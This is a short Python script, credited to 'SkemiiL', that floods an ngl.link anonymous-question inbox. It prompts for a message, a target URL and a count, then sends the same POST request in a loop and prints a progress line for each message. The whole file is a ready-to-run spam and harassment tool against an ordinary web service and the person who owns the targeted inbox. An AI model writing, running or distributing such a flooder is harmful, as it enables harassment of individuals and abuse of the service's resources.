import requests
# -------------------------------------------
# ngl.link flooder by SkemiiL
# -------------------------------------------
text = input("Text: ")
url = input("url: ")
amt = input("Amount of messages: ")
amt = int(amt)

for x in range(0, amt):
    requests.post(url, allow_redirects=False, data={
    "question": text
    })
    print("Sending text: %s to %s. Message %i out of %i" % (text, url, x, amt))